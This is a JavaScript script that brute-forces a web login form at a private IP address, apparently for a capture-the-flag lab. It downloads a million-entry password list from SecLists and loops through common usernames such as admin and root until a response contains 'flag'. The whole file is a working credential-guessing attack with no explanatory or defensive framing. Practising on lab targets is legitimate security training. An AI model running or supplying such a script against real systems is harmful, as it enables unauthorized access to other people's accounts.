const baseUrl = "http://10.12.100.90/?page=signin";

async function tryPassword(username, password) {
  try {
    const url = `${baseUrl}&username=${encodeURIComponent(
      username
    )}&password=${encodeURIComponent(password)}&Login=Login`;
    const response = await fetch(url, {
      method: "GET",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
    });

    const text = await response.text();

    if (text.toLowerCase().includes("flag")) {
      console.log(`Response: ${text}`);
      return true;
    } else {
      console.log(`Failed with ${username} and ${password}`);
      return false;
    }
  } catch (error) {
    console.error(`Error with password ${password}: ${error}`);
    return false;
  }
}

async function bruteForceLogin(usernames) {
  try {
    const url =
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt";
    const response = await fetch(url);
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    const text = await response.text();
    const passwords = text
      .split("\n")
      .map((p) => p.trim())
      .filter((p) => p.length > 0);

    console.log(`Loaded ${passwords.length} passwords`);

    for (const username of usernames) {
      for (const password of passwords) {
        const success = await tryPassword(username, password);
        if (success) {
          console.log(`found credentials: ${username}:${password}`);
          return;
        }
      }
    }

    console.log("Brute force attempt completed");
  } catch (error) {
    console.error("Error reading password file:", error);
  }
}

const usernames = [
  "Flag",
  "one",
  "two",
  "trhee",
  "user",
  "root",
  "admin",
  "administrator",
  "superuser",
  "guest",
  "test",
  "info",
  "support",
  "manager",
  "moderator",
  "webmaster",
  "backup",
  "anonymous",
  "administartor",
  "administartion",
];

bruteForceLogin(usernames);
